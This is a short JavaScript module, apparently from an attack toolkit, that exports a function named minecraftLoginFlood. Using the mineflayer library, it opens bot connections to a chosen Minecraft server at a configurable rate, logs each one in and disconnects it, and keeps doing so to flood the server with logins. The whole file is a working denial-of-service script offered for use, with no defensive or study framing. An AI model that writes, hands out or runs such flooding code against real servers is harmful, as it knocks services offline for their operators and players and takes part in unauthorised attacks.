const mineflayer = require('mineflayer');

function minecraftLoginFlood(target, rateLimit, logOutput) {
    setInterval(() => {
        const bot = mineflayer.createBot({
            host: target,
            username: 'bot',
            password: 'password'
        });

        bot.on('login', () => {
            logOutput('Bot logged in');
            bot.end();
        });

        bot.on('error', (err) => {
            logOutput('Bot error: ' + err.message);
        });
    }, 1000 / rateLimit);
}

module.exports = minecraftLoginFlood;
